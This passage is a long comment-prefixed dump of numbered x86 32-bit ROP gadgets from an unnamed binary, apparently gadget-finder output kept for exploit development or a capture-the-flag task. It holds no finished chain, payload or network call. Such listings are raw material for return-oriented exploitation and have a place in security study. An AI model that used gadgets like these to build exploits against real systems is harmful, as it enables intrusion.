# 080bb908:	ret
# Gadget #2487:
# 080bb902:	fisttp	dword ptr [ecx + 0x5f5e5bd8]
# 080bb908:	ret
# Gadget #2488:
# 080bb914:	sal	byte ptr [ebp + 6], 0x89
# 080bb918:	fcomp	dword ptr [ebx + 0x5e]
# 080bb91b:	pop	edi
# 080bb91c:	ret
# Gadget #2489:
# 080bb915:	jne	0x80bb91d
# 080bb917:	mov	eax, ebx
# 080bb919:	pop	ebx
# 080bb91a:	pop	esi
# 080bb91b:	pop	edi
# 080bb91c:	ret
# Gadget #2490:
# 080bb916:	push	es
# 080bb917:	mov	eax, ebx
# 080bb919:	pop	ebx
# 080bb91a:	pop	esi
# 080bb91b:	pop	edi
# 080bb91c:	ret
# Gadget #2491:
# 080bba55:	sbb	byte ptr [ebx + 0x5e5b3cc4], al
# 080bba5b:	pop	edi
# 080bba5c:	pop	ebp
# 080bba5d:	ret
# Gadget #2492:
# 080bbb7e:	add	byte ptr [ebx + 0xfc08500], cl
# 080bbb84:	inc	esp
# 080bbb85:	ret
# Gadget #2493:
# 080bbb82:	ror	byte ptr [edi], 0x44
# 080bbb85:	ret
# Gadget #2494:
# 080bbc65:	in	al, dx
# 080bbc66:	or	al, 0x83
# 080bbc68:	ret
# Gadget #2495:
# 080bbe1a:	in	al, dx
# 080bbe1b:	add	al, 0x83
# 080bbe1d:	ret
# Gadget #2496:
# 080bc0d9:	mov	eax, 0x5bf4658d
# 080bc0de:	pop	esi
# 080bc0df:	pop	edi
# 080bc0e0:	pop	ebp
# 080bc0e1:	ret
# Gadget #2497:
# 080bc159:	fucomi	st(3)
# 080bc15b:	jge	0x8b0be7d5
# 080bc161:	ret
# Gadget #2498:
# 080bc75b:	loopne	0x80bc6ea
# 080bc75d:	je	0x80bc785
# 080bc75f:	add	byte ptr [ebx + 0x5e], bl
# 080bc762:	pop	edi
# 080bc763:	ret
# Gadget #2499:
# 080bc75c:	lea	esi, [esi]
# 080bc760:	pop	ebx
# 080bc761:	pop	esi
# 080bc762:	pop	edi
# 080bc763:	ret
# Gadget #2500:
# 080bc75e:	add	byte ptr es:[ebx + 0x5e], bl
# 080bc762:	pop	edi
# 080bc763:	ret
# Gadget #2501:
# 080bc933:	or	byte ptr [ecx - 0x8f63], cl
# 080bc939:	inc	edi
# 080bc93b:	ret
# Gadget #2502:
# 080bc96a:	pop	ebp
# 080bc96b:	mov	bh, al
# 080bc96d:	ret
# Gadget #2503:
# 080bc989:	or	byte ptr [ecx - 0xb363], cl
# 080bc98f:	inc	edi
# 080bc991:	ret
# Gadget #2504:
# 080bc99b:	dec	dword ptr [ecx - 0xb763]
# 080bc9a1:	inc	edi
# 080bc9a3:	ret
# Gadget #2505:
# 080bcade:	or	byte ptr [ebp + 0x5e5bf465], cl
# 080bcae4:	pop	edi
# 080bcae5:	pop	ebp
# 080bcae6:	ret
# Gadget #2506:
# 080bd543:	dec	dword ptr [ebp - 0x76ffd98c]
# 080bd549:	ret
# Gadget #2507:
# 080bdabf:	and	al, 0x7f
# 080bdac1:	add	byte ptr [eax], al
# 080bdac3:	add	al, ch
# 080bdac5:	ret
# Gadget #2508:
# 080bdd5c:	add	dword ptr [ebx + 0x5e5b2cc4], eax
# 080bdd62:	pop	edi
# 080bdd63:	pop	ebp
# 080bdd64:	ret
# Gadget #2509:
# 080bdecf:	add	al, 0x83
# 080bded1:	les	ebp, ptr [ebx + ebx*2]
# 080bded4:	pop	esi
# 080bded5:	pop	edi
# 080bded6:	pop	ebp
# 080bded7:	ret
# Gadget #2510:
# 080be078:	mov	ah, 0x8d
# 080be07a:	hlt
# 080be07c:	pop	ebx
# 080be07d:	pop	esi
# 080be07e:	pop	edi
# 080be07f:	pop	ebp
# 080be080:	ret
# Gadget #2511:
# 080be22c:	ror	byte ptr [edi], 1
# 080be22e:	test	dword ptr [ebp - 0x7d000000], esi
# 080be234:	ret
# Gadget #2512:
# 080be248:	fadd	dword ptr [ebx + 0x5e5b04c4]
# 080be24e:	pop	edi
# 080be24f:	pop	ebp
# 080be250:	ret
# Gadget #2513:
# 080be2e9:	les	eax, ptr [ecx + ebp]
# 080be2ec:	rcr	byte ptr [ebx + 0x5e], 1
# 080be2ef:	pop	edi
# 080be2f0:	pop	ebp
# 080be2f1:	ret
# Gadget #2514:
# 080be2ea:	add	al, 0x29
# 080be2ec:	rcr	byte ptr [ebx + 0x5e], 1
# 080be2ef:	pop	edi
# 080be2f0:	pop	ebp
# 080be2f1:	ret
# Gadget #2515:
# 080be2eb:	sub	eax, edx
# 080be2ed:	pop	ebx
# 080be2ee:	pop	esi
# 080be2ef:	pop	edi
# 080be2f0:	pop	ebp
# 080be2f1:	ret
# Gadget #2516:
# 080be47a:	hlt
# 080be47c:	xor	eax, eax
# 080be47e:	pop	ebx
# 080be47f:	pop	esi
# 080be480:	pop	edi
# 080be481:	pop	ebp
# 080be482:	ret
# Gadget #2517:
# 080be47b:	hlt
# 080be47c:	xor	eax, eax
# 080be47e:	pop	ebx
# 080be47f:	pop	esi
# 080be480:	pop	edi
# 080be481:	pop	ebp
# 080be482:	ret
# Gadget #2518:
# 080be721:	in	al, dx
# 080be722:	add	al, 0x89
# 080be724:	ret
# Gadget #2519:
# 080bea9d:	cli
# 080bea9e:	std
# 080bea9f:	jbe	0x80beab0
# 080beaa1:	add	esp, 8
# 080beaa4:	pop	ebx
# 080beaa5:	ret
# Gadget #2520:
# 080beaf7:	mov	eax, 1
# 080beafc:	pop	esi
# 080beafd:	pop	edi
# 080beafe:	ret
# Gadget #2521:
# 080beafa:	add	byte ptr [eax], al
# 080beafc:	pop	esi
# 080beafd:	pop	edi
# 080beafe:	ret
# Gadget #2522:
# 080beafb:	add	byte ptr [esi + 0x5f], bl
# 080beafe:	ret
# Gadget #2523:
# 080beb45:	dec	dword ptr [ecx + 0x5bc03106]
# 080beb4b:	pop	esi
# 080beb4c:	pop	edi
# 080beb4d:	ret
# Gadget #2524:
# 080beb46:	mov	dword ptr [esi], eax
# 080beb48:	xor	eax, eax
# 080beb4a:	pop	ebx
# 080beb4b:	pop	esi
# 080beb4c:	pop	edi
# 080beb4d:	ret
# Gadget #2525:
# 080beb47:	push	es
# 080beb48:	xor	eax, eax
# 080beb4a:	pop	ebx
# 080beb4b:	pop	esi
# 080beb4c:	pop	edi
# 080beb4d:	ret
# Gadget #2526:
# 080beb49:	rcr	byte ptr [ebx + 0x5e], 0x5f
# 080beb4d:	ret
# Gadget #2527:
# 080becae:	cmp	eax, 0x5b2cc483
# 080becb3:	pop	esi
# 080becb4:	pop	edi
# 080becb5:	pop	ebp
# 080becb6:	ret
# Gadget #2528:
# 080bee03:	cmp	eax, dword ptr [ebx + 0x5e5b2cc4]
# 080bee09:	pop	edi
# 080bee0a:	pop	ebp
# 080bee0b:	ret
# Gadget #2529:
# 080bee9b:	cmp	edx, eax
# 080bee9d:	je	0x80beea8
# 080bee9f:	add	esp, 8
# 080beea2:	pop	ebx
# 080beea3:	ret
# Gadget #2530:
# 080bee9c:	ret	0x974
# 080bee9f:	add	esp, 8
# 080beea2:	pop	ebx
# 080beea3:	ret
# Gadget #2531:
# 080bef2f:	nop
# 080bef30:	endbr32
# 080bef34:	mov	eax, dword ptr [eax + 4]
# 080bef37:	ret
# Gadget #2532:
# 080bef32:	push	ds
# 080bef33:	sti
# 080bef34:	mov	eax, dword ptr [eax + 4]
# 080bef37:	ret
# Gadget #2533:
# 080bef46:	add	al, 0x65
# 080bef48:	sub	eax, dword ptr [0]
# 080bef4e:	ret
# Gadget #2534:
# 080bef47:	sub	eax, dword ptr gs:[0]
# 080bef4e:	ret
# Gadget #2535:
# 080befee:	adc	al, 0x8b
# 080beff0:	inc	edi
# 080beff1:	add	al, 0x89
# 080beff3:	ret
# Gadget #2536:
# 080bf312:	add	byte ptr [ebx + 0x5e5b5cc4], al
# 080bf318:	pop	edi
# 080bf319:	pop	ebp
# 080bf31a:	ret
# Gadget #2537:
# 080bf59c:	fmul	qword ptr [ebx - 0x7cebdba4]
# 080bf5a2:	ret
# Gadget #2538:
# 080bf5a0:	adc	al, 0x83
# 080bf5a2:	ret
# Gadget #2539:
# 080bf808:	jae	0x80bf7f0
# 080bf80a:	mov	eax, 1
# 080bf80f:	pop	ebx
# 080bf810:	ret
# Gadget #2540:
# 080bf809:	out	0xb8, al
# 080bf80b:	add	dword ptr [eax], eax
# 080bf80d:	add	byte ptr [eax], al
# 080bf80f:	pop	ebx
# 080bf810:	ret
# Gadget #2541:
# 080bf813:	add	byte ptr es:[eax], al
# 080bf816:	add	byte ptr [eax], al
# 080bf818:	xor	eax, eax
# 080bf81a:	pop	ebx
# 080bf81b:	ret
# Gadget #2542:
# 080bf814:	add	byte ptr [eax], al
# 080bf816:	add	byte ptr [eax], al
# 080bf818:	xor	eax, eax
# 080bf81a:	pop	ebx
# 080bf81b:	ret
# Gadget #2543:
# 080bf9fc:	rol	byte ptr [ebx + 0x5e5b5cc4], 0x5f
# 080bfa03:	pop	ebp
# 080bfa04:	ret
# Gadget #2544:
# 080bfb12:	adc	al, 0x83
# 080bfb14:	les	ebx, ptr [ebx + ebx*2 + 0x5e]
# 080bfb18:	pop	edi
# 080bfb19:	pop	ebp
# 080bfb1a:	ret
# Gadget #2545:
# 080bfff9:	call	0x80bf820
# 080bfffe:	add	esp, 0x2c
# 080c0001:	ret
# Gadget #2546:
# 080c0046:	sbb	eax, eax
# 080c0048:	and	eax, 2
# 080c004b:	sub	eax, 1
# 080c004e:	ret
# Gadget #2547:
# 080c0047:	rol	byte ptr [ebx - 0x177cfd20], 1
# 080c004e:	ret
# Gadget #2548:
# 080c0049:	loopne	0x80c004d
# 080c004b:	sub	eax, 1
# 080c004e:	ret
# Gadget #2549:
# 080c004d:	add	ebx, eax
# 080c004f:	nop
# 080c0050:	xor	eax, eax
# 080c0052:	pop	ebx
# 080c0053:	pop	esi
# 080c0054:	ret
# Gadget #2550:
# 080c004e:	ret
# 080c004f:	nop
# 080c0050:	xor	eax, eax
# 080c0052:	pop	ebx
# 080c0053:	pop	esi
# 080c0054:	ret
# Gadget #2551:
# 080c0263:	sbb	byte ptr [ebx + 0x5e5b2cc4], al
# 080c0269:	pop	edi
# 080c026a:	pop	ebp
# 080c026b:	ret
# Gadget #2552:
# 080c0367:	mov	dl, 0x89
# 080c0369:	fmul	dword ptr [ecx - 0x76080836]
# 080c036f:	ret
# Gadget #2553:
# 080c049e:	movsd	dword ptr es:[edi], dword ptr [esi]
# 080c049f:	ret
# Gadget #2554:
# 080c04a6:	shl	eax, cl
# 080c04a8:	mov	dword ptr [edi], eax
# 080c04aa:	pop	eax
# 080c04ab:	pop	ebx
# 080c04ac:	pop	esi
# 080c04ad:	pop	edi
# 080c04ae:	ret
# Gadget #2555:
# 080c04a7:	loopne	0x80c0432
# 080c04a9:	pop	es
# 080c04aa:	pop	eax
# 080c04ab:	pop	ebx
# 080c04ac:	pop	esi
# 080c04ad:	pop	edi
# 080c04ae:	ret
# Gadget #2556:
# 080c04ae:	ret
# 080c04af:	shl	ebx, cl
# 080c04b1:	mov	dword ptr [edi], ebx
# 080c04b3:	pop	ebx
# 080c04b4:	pop	esi
# 080c04b5:	pop	edi
# 080c04b6:	ret
# Gadget #2557:
# 080c04b0:	jecxz	0x80c043b
# 080c04b2:	pop	ds
# 080c04b3:	pop	ebx
# 080c04b4:	pop	esi
# 080c04b5:	pop	edi
# 080c04b6:	ret
# Gadget #2558:
# 080c0506:	lodsd	eax, dword ptr [esi]
# 080c0507:	ret
# Gadget #2559:
# 080c050e:	shr	eax, cl
# 080c0510:	mov	dword ptr [edi], eax
# 080c0512:	pop	eax
# 080c0513:	pop	ebx
# 080c0514:	pop	esi
# 080c0515:	pop	edi
# 080c0516:	ret
# Gadget #2560:
# 080c050f:	call	0x63640c9d
# 080c0514:	pop	esi
# 080c0515:	pop	edi
# 080c0516:	ret
# Gadget #2561:
# 080c0511:	pop	es
# 080c0512:	pop	eax
# 080c0513:	pop	ebx
# 080c0514:	pop	esi
# 080c0515:	pop	edi
# 080c0516:	ret
# Gadget #2562:
# 080c0516:	ret
# 080c0517:	shr	ebx, cl
# 080c0519:	mov	dword ptr [edi], ebx
# 080c051b:	pop	ebx
# 080c051c:	pop	esi
# 080c051d:	pop	edi
# 080c051e:	ret
# Gadget #2563:
# 080c0518:	jmp	0x80c04a3
# 080c051a:	pop	ds
# 080c051b:	pop	ebx
# 080c051c:	pop	esi
# 080c051d:	pop	edi
# 080c051e:	ret
# Gadget #2564:
# 080c0616:	inc	ebp
# 080c0617:	rol	byte ptr [ecx], 1
# 080c0619:	ret
# Gadget #2565:
# 080c0766:	xor	dword ptr [ecx - 0x397cc4fc], ecx
# 080c076c:	add	al, 0x83
# 080c076e:	ret
# Gadget #2566:
# 080c0938:	jne	0x80c0928
# 080c093a:	mov	eax, ebp
# 080c093c:	pop	ebx
# 080c093d:	pop	ebp
# 080c093e:	pop	esi
# 080c093f:	pop	edi
# 080c0940:	ret
# Gadget #2567:
# 080c0939:	out	dx, al
# 080c093a:	mov	eax, ebp
# 080c093c:	pop	ebx
# 080c093d:	pop	ebp
# 080c093e:	pop	esi
# 080c093f:	pop	edi
# 080c0940:	ret
# Gadget #2568:
# 080c093b:	call	0x676a669b
# 080c0940:	ret
# Gadget #2569:
# 080c09fb:	fadd	dword ptr [ebx + 0x5e5b0cc4]
# 080c0a01:	pop	edi
# 080c0a02:	pop	ebp
# 080c0a03:	ret
# Gadget #2570:
# 080c0b02:	lahf
# 080c0b03:	add	esp, 0x2c
# 080c0b06:	pop	ebx
# 080c0b07:	pop	esi
# 080c0b08:	pop	edi
# 080c0b09:	pop	ebp
# 080c0b0a:	ret
# Gadget #2571:
# 080c0f1b:	fiadd	dword ptr [ebx + 0x5e5b1cc4]
# 080c0f21:	pop	edi
# 080c0f22:	pop	ebp
# 080c0f23:	ret
# Gadget #2572:
# 080c13d7:	jnp	0x80c1366
# 080c13d9:	hlt
# 080c13db:	pop	ebx
# 080c13dc:	pop	esi
# 080c13dd:	pop	edi
# 080c13de:	pop	ebp
# 080c13df:	ret
# Gadget #2573:
# 080c1518:	xchg	edi, eax
# 080c1519:	sbb	eax, eax
# 080c151b:	neg	eax
# 080c151d:	pop	ebx
# 080c151e:	pop	esi
# 080c151f:	pop	edi
# 080c1520:	ret
# Gadget #2574:
# 080c151a:	sal	bh, 0xd8
# 080c151d:	pop	ebx
# 080c151e:	pop	esi
# 080c151f:	pop	edi
# 080c1520:	ret
# Gadget #2575:
# 080c156b:	jne	0x80c1558
# 080c156d:	mov	eax, ebp
# 080c156f:	pop	ebx
# 080c1570:	pop	ebp
# 080c1571:	pop	esi
# 080c1572:	pop	edi
# 080c1573:	ret
# Gadget #2576:
# 080c156c:	jmp	0x80c14f7
# 080c156e:	call	0x676a72ce
# 080c1573:	ret
# Gadget #2577:
# 080c15db:	add	al, byte ptr [eax]
# 080c15dd:	add	byte ptr [eax], al
# 080c15df:	pop	ebx
# 080c15e0:	pop	esi
# 080c15e1:	pop	edi
# 080c15e2:	pop	ebp
# 080c15e3:	ret
# Gadget #2578:
# 080c15f2:	add	byte ptr [ecx + 0x5e5b047b], cl
# 080c15f8:	pop	edi
# 080c15f9:	pop	ebp
# 080c15fa:	ret
# Gadget #2579:
# 080c15f3:	mov	dword ptr [ebx + 4], edi
# 080c15f6:	pop	ebx
# 080c15f7:	pop	esi
# 080c15f8:	pop	edi
# 080c15f9:	pop	ebp
# 080c15fa:	ret
# Gadget #2580:
# 080c15f4:	jnp	0x80c15fa
# 080c15f6:	pop	ebx
# 080c15f7:	pop	esi
# 080c15f8:	pop	edi
# 080c15f9:	pop	ebp
# 080c15fa:	ret
# Gadget #2581:
# 080c18ad:	add	al, 0
# 080c18af:	add	byte ptr [eax], al
# 080c18b1:	pop	ebx
# 080c18b2:	pop	esi
# 080c18b3:	pop	edi
# 080c18b4:	pop	ebp
# 080c18b5:	ret
# Gadget #2582:
# 080c1c37:	mov	dword ptr [esi + 8], eax
# 080c1c3a:	add	esp, 0x24
# 080c1c3d:	pop	ebx
# 080c1c3e:	pop	esi
# 080c1c3f:	ret
# Gadget #2583:
# 080c1c38:	inc	esi
# 080c1c39:	or	byte ptr [ebx + 0x5e5b24c4], al
# 080c1c3f:	ret
# Gadget #2584:
# 080c1cec:	add	esp, 0x2c
# 080c1cef:	ret
# Gadget #2585:
# 080c1d36:	add	esp, 0x1c
# 080c1d39:	movzx	eax, al
# 080c1d3c:	neg	eax
# 080c1d3e:	ret
# Gadget #2586:
# 080c1d37:	les	ebx, ptr [edi + ecx]
# 080c1d3a:	mov	dh, 0xc0
# 080c1d3c:	neg	eax
# 080c1d3e:	ret
# Gadget #2587:
# 080c1d38:	sbb	al, 0xf
# 080c1d3a:	mov	dh, 0xc0
# 080c1d3c:	neg	eax
# 080c1d3e:	ret
# Gadget #2588:
# 080c1d3b:	sal	bh, 0xd8
# 080c1d3e:	ret
# Gadget #2589:
# 080c1d65:	mov	dword ptr [esi + 0xc], eax
# 080c1d68:	add	esp, 0x14
# 080c1d6b:	pop	ebx
# 080c1d6c:	pop	esi
# 080c1d6d:	ret
# Gadget #2590:
# 080c1d66:	inc	esi
# 080c1d67:	or	al, 0x83
# 080c1d69:	les	edx, ptr [ebx + ebx*2]
# 080c1d6c:	pop	esi
# 080c1d6d:	ret
# Gadget #2591:
# 080c1e0f:	or	byte ptr [ebx - 0xf76db3c], al
# 080c1e15:	pop	ebx
# 080c1e16:	pop	esi
# 080c1e17:	ret
# Gadget #2592:
# 080c1e10:	add	esp, 0x24
# 080c1e13:	mov	eax, esi
# 080c1e15:	pop	ebx
# 080c1e16:	pop	esi
# 080c1e17:	ret
# Gadget #2593:
# 080c1e48:	mov	dword ptr [esi + 0x10], eax
# 080c1e4b:	add	esp, 0x14
# 080c1e4e:	pop	ebx
# 080c1e4f:	pop	esi
# 080c1e50:	ret
# Gadget #2594:
# 080c1e49:	inc	esi
# 080c1e4a:	adc	byte ptr [ebx + 0x5e5b14c4], al
# 080c1e50:	ret
# Gadget #2595:
# 080c1f0b:	mov	eax, esi
# 080c1f0d:	pop	ebx
# 080c1f0e:	pop	esi
# 080c1f0f:	ret
# Gadget #2596:
# 080c1fc2:	xchg	edx, eax
# 080c1fc3:	sal	byte ptr [eax + 0x450ffffb], 0xc2
# 080c1fca:	ret
# Gadget #2597:
# 080c1ff7:	cmovne	eax, ecx
# 080c1ffa:	ret
# Gadget #2598:
# 080c2038:	add	dword ptr [ecx + 0x5bf88906], ecx
# 080c203e:	pop	esi
# 080c203f:	pop	edi
# 080c2040:	ret
# Gadget #2599:
# 080c2039:	mov	dword ptr [esi], eax
# 080c203b:	mov	eax, edi
# 080c203d:	pop	ebx
# 080c203e:	pop	esi
# 080c203f:	pop	edi
# 080c2040:	ret
# Gadget #2600:
# 080c203a:	push	es
# 080c203b:	mov	eax, edi
# 080c203d:	pop	ebx
# 080c203e:	pop	esi
# 080c203f:	pop	edi
# 080c2040:	ret
# Gadget #2601:
# 080c204d:	add	byte ptr [ecx + 0x5f5e5bf8], cl
# 080c2053:	ret
# Gadget #2602:
# 080c392c:	jne	0x80c3f90
# 080c3932:	pop	edi
# 080c3933:	pop	ebx
# 080c3934:	ret
# Gadget #2603:
# 080c392d:	test	dword ptr [esi + 6], ebx
# 080c3930:	add	byte ptr [eax], al
# 080c3932:	pop	edi
# 080c3933:	pop	ebx
# 080c3934:	ret
# Gadget #2604:
# 080c392e:	pop	esi
# 080c392f:	push	es
# 080c3930:	add	byte ptr [eax], al
# 080c3932:	pop	edi
# 080c3933:	pop	ebx
# 080c3934:	ret
# Gadget #2605:
# 080c3931:	add	byte ptr [edi + 0x5b], bl
# 080c3934:	ret
# Gadget #2606:
# 080c3970:	jne	0x80c3f90
# 080c3976:	pop	edi
# 080c3977:	pop	ebx
# 080c3978:	ret
# Gadget #2607:
# 080c3971:	test	dword ptr [edx], ebx
# 080c3973:	push	es
# 080c3974:	add	byte ptr [eax], al
# 080c3976:	pop	edi
# 080c3977:	pop	ebx
# 080c3978:	ret
# Gadget #2608:
# 080c3972:	sbb	al, byte ptr [esi]
# 080c3974:	add	byte ptr [eax], al
# 080c3976:	pop	edi
# 080c3977:	pop	ebx
# 080c3978:	ret
# Gadget #2609:
# 080c39c6:	jne	0x80c3f90
# 080c39cc:	pop	edi
# 080c39cd:	pop	ebx
# 080c39ce:	ret
# Gadget #2610:
# 080c39c7:	test	esp, eax
# 080c39c9:	add	eax, 0x5b5f0000
# 080c39ce:	ret
# Gadget #2611:
# 080c39c8:	les	eax, ptr [0x5b5f0000]
# 080c39ce:	ret
# Gadget #2612:
# 080c39ca:	add	byte ptr [eax], al
# 080c39cc:	pop	edi
# 080c39cd:	pop	ebx
# 080c39ce:	ret
# Gadget #2613:
# 080c3a00:	jne	0x80c3f90
# 080c3a06:	pop	edi
# 080c3a07:	pop	ebx
# 080c3a08:	ret
# Gadget #2614:
# 080c3a01:	test	dword ptr [edx + 0x5f000005], ecx
# 080c3a07:	pop	ebx
# 080c3a08:	ret
# Gadget #2615:
# 080c3a02:	mov	al, byte ptr [0x5b5f0000]
# 080c3a08:	ret
# Gadget #2616:
# 080c3a03:	add	eax, 0x5b5f0000
# 080c3a08:	ret
# Gadget #2617:
# 080c3b7d:	mov	eax, dword ptr [ecx]
# 080c3b7f:	mov	dword ptr [edx], eax
# 080c3b81:	mov	eax, edi
# 080c3b83:	pop	edi
# 080c3b84:	pop	ebx
# 080c3b85:	ret
# Gadget #2618:
# 080c3b7e:	add	dword ptr [ecx + 0x5ff88902], ecx
# 080c3b84:	pop	ebx
# 080c3b85:	ret
# Gadget #2619:
# 080c3b82:	clc
# 080c3b83:	pop	edi
# 080c3b84:	pop	ebx
# 080c3b85:	ret
# Gadget #2620:
# 080c3baf:	movlpd	qword ptr [edx], xmm0
# 080c3bb3:	mov	eax, edi
# 080c3bb5:	pop	edi
# 080c3bb6:	pop	ebx
# 080c3bb7:	ret
# Gadget #2621:
# 080c3bb0:	movlps	qword ptr [edx], xmm0
# 080c3bb3:	mov	eax, edi
# 080c3bb5:	pop	edi
# 080c3bb6:	pop	ebx
# 080c3bb7:	ret
# Gadget #2622:
# 080c3bb1:	adc	eax, dword ptr [edx]
# 080c3bb3:	mov	eax, edi
# 080c3bb5:	pop	edi
# 080c3bb6:	pop	ebx
# 080c3bb7:	ret
# Gadget #2623:
# 080c3bea:	add	cl, byte ptr [ecx - 0x776f7be]
# 080c3bf0:	pop	edi
# 080c3bf1:	pop	ebx
# 080c3bf2:	ret
# Gadget #2624:
# 080c3beb:	mov	dword ptr [edx + 8], eax
# 080c3bee:	mov	eax, edi
# 080c3bf0:	pop	edi
# 080c3bf1:	pop	ebx
# 080c3bf2:	ret
# Gadget #2625:
# 080c3c29:	movlps	qword ptr [edx + 8], xmm1
# 080c3c2d:	mov	eax, edi
# 080c3c2f:	pop	edi
# 080c3c30:	pop	ebx
# 080c3c31:	ret
# Gadget #2626:
# 080c3c2a:	adc	ecx, dword ptr [edx + 8]
# 080c3c2d:	mov	eax, edi
# 080c3c2f:	pop	edi
# 080c3c30:	pop	ebx
# 080c3c31:	ret
# Gadget #2627:
# 080c3c4c:	jne	0x80c3f90
# 080c3c52:	pop	edi
# 080c3c53:	pop	ebx
# 080c3c54:	ret
# Gadget #2628:
# 080c3c4d:	test	dword ptr [esi], edi
# 080c3c4f:	add	eax, dword ptr [eax]
# 080c3c51:	add	byte ptr [edi + 0x5b], bl
# 080c3c54:	ret
# Gadget #2629:
# 080c3c4e:	add	eax, dword ptr ds:[eax]
# 080c3c51:	add	byte ptr [edi + 0x5b], bl
# 080c3c54:	ret
# Gadget #2630:
# 080c3c6e:	jne	0x80c3f90
# 080c3c74:	pop	edi
# 080c3c75:	pop	ebx
# 080c3c76:	ret
# Gadget #2631:
# 080c3c6f:	test	dword ptr [ebx + eax], ebx
# 080c3c72:	add	byte ptr [eax], al
# 080c3c74:	pop	edi
# 080c3c75:	pop	ebx
# 080c3c76:	ret
# Gadget #2632:
# 080c3c70:	sbb	al, 3
# 080c3c72:	add	byte ptr [eax], al
# 080c3c74:	pop	edi
# 080c3c75:	pop	ebx
# 080c3c76:	ret
# Gadget #2633:
# 080c3c71:	add	eax, dword ptr [eax]
# 080c3c73:	add	byte ptr [edi + 0x5b], bl
# 080c3c76:	ret
# Gadget #2634:
# 080c3c94:	jne	0x80c3f90
# 080c3c9a:	pop	edi
# 080c3c9b:	pop	ebx
# 080c3c9c:	ret
# Gadget #2635:
# 080c3c95:	test	esi, esi
# 080c3c97:	add	al, byte ptr [eax]
# 080c3c99:	add	byte ptr [edi + 0x5b], bl
# 080c3c9c:	ret
# Gadget #2636:
# 080c3c96:	test	byte ptr [edx], 0
# 080c3c99:	add	byte ptr [edi + 0x5b], bl
# 080c3c9c:	ret
# Gadget #2637:
# 080c3cb2:	jne	0x80c3f90
# 080c3cb8:	pop	edi
# 080c3cb9:	pop	ebx
# 080c3cba:	ret
# Gadget #2638:
# 080c3cb3:	test	eax, ebx
# 080c3cb5:	add	al, byte ptr [eax]
# 080c3cb7:	add	byte ptr [edi + 0x5b], bl
# 080c3cba:	ret
# Gadget #2639:
# 080c3cb4:	fadd	dword ptr [edx]
# 080c3cb6:	add	byte ptr [eax], al
# 080c3cb8:	pop	edi
# 080c3cb9:	pop	ebx
# 080c3cba:	ret
# Gadget #2640:
# 080c3cd4:	jne	0x80c3f90
# 080c3cda:	pop	edi
# 080c3cdb:	pop	ebx
# 080c3cdc:	ret
# Gadget #2641:
# 080c3cd5:	test	dword ptr [esi + 0x5f000002], esi
# 080c3cdb:	pop	ebx
# 080c3cdc:	ret
# Gadget #2642:
# 080c3cd6:	mov	dh, 2
# 080c3cd8:	add	byte ptr [eax], al
# 080c3cda:	pop	edi
# 080c3cdb:	pop	ebx
# 080c3cdc:	ret
# Gadget #2643:
# 080c3cd7:	add	al, byte ptr [eax]
# 080c3cd9:	add	byte ptr [edi + 0x5b], bl
# 080c3cdc:	ret
# Gadget #2644:
# 080c3cf2:	jne	0x80c3f90
# 080c3cf8:	pop	edi
# 080c3cf9:	pop	ebx
# 080c3cfa:	ret
# Gadget #2645:
# 080c3cf3:	test	dword ptr [eax + 0x5f000002], ebx
# 080c3cf9:	pop	ebx
# 080c3cfa:	ret
# Gadget #2646:
# 080c3cf4:	cwde
# 080c3cf5:	add	al, byte ptr [eax]
# 080c3cf7:	add	byte ptr [edi + 0x5b], bl
# 080c3cfa:	ret
# Gadget #2647:
# 080c3d16:	jne	0x80c3f90
# 080c3d1c:	pop	edi
# 080c3d1d:	pop	ebx
# 080c3d1e:	ret
# Gadget #2648:
# 080c3d17:	test	dword ptr [edx + eax], esi
# 080c3d1b:	add	byte ptr [edi + 0x5b], bl
# 080c3d1e:	ret
# Gadget #2649:
# 080c3d18:	je	0x80c3d1c
# 080c3d1a:	add	byte ptr [eax], al
# 080c3d1c:	pop	edi
# 080c3d1d:	pop	ebx
# 080c3d1e:	ret
# Gadget #2650:
# 080c3d38:	jne	0x80c3f90
# 080c3d3e:	pop	edi
# 080c3d3f:	pop	ebx
# 080c3d40:	ret
# Gadget #2651:
# 080c3d39:	test	dword ptr [edx + 2], edx
# 080c3d3c:	add	byte ptr [eax], al
# 080c3d3e:	pop	edi
# 080c3d3f:	pop	ebx
# 080c3d40:	ret
# Gadget #2652:
# 080c3d3a:	push	edx
# 080c3d3b:	add	al, byte ptr [eax]
# 080c3d3d:	add	byte ptr [edi + 0x5b], bl
# 080c3d40:	ret
# Gadget #2653:
# 080c3d66:	jne	0x80c3f90
# 080c3d6c:	pop	edi
# 080c3d6d:	pop	ebx
# 080c3d6e:	ret
# Gadget #2654:
# 080c3d67:	test	dword ptr [edx + eax], esp
# 080c3d6a:	add	byte ptr [eax], al
# 080c3d6c:	pop	edi
# 080c3d6d:	pop	ebx
# 080c3d6e:	ret
# Gadget #2655:
# 080c3d68:	and	al, 2
# 080c3d6a:	add	byte ptr [eax], al
# 080c3d6c:	pop	edi
# 080c3d6d:	pop	ebx
# 080c3d6e:	ret
# Gadget #2656:
# 080c3d8a:	jne	0x80c3f90
# 080c3d90:	pop	edi
# 080c3d91:	pop	ebx
# 080c3d92:	ret
# Gadget #2657:
# 080c3d8b:	test	dword ptr [eax], eax
# 080c3d8d:	add	al, byte ptr [eax]
# 080c3d8f:	add	byte ptr [edi + 0x5b], bl
# 080c3d92:	ret
# Gadget #2658:
# 080c3d8c:	add	byte ptr [edx], al
# 080c3d8e:	add	byte ptr [eax], al
# 080c3d90:	pop	edi
# 080c3d91:	pop	ebx
# 080c3d92:	ret
# Gadget #2659:
# 080c3dba:	jne	0x80c3f90
# 080c3dc0:	pop	edi
# 080c3dc1:	pop	ebx
# 080c3dc2:	ret
# Gadget #2660:
# 080c3dbb:	test	eax, edx
# 080c3dbd:	add	dword ptr [eax], eax
# 080c3dbf:	add	byte ptr [edi + 0x5b], bl
# 080c3dc2:	ret
# Gadget #2661:
# 080c3dbc:	rol	byte ptr [ecx], 1
# 080c3dbe:	add	byte ptr [eax], al
# 080c3dc0:	pop	edi
# 080c3dc1:	pop	ebx
# 080c3dc2:	ret
# Gadget #2662:
# 080c3dea:	jne	0x80c3f90
# 080c3df0:	pop	edi
# 080c3df1:	pop	ebx
# 080c3df2:	ret
# Gadget #2663:
# 080c3deb:	test	dword ptr [eax + 0x5f000001], esp
# 080c3df1:	pop	ebx
# 080c3df2:	ret
# Gadget #2664:
# 080c3dec:	mov	al, byte ptr [0x5f000001]
# 080c3df1:	pop	ebx
# 080c3df2:	ret
# Gadget #2665:
# 080c3ded:	add	dword ptr [eax], eax
# ...
# 080c64ec:	clc
# 080c64ed:	sar	eax, 2
# 080c64f0:	pop	ebx
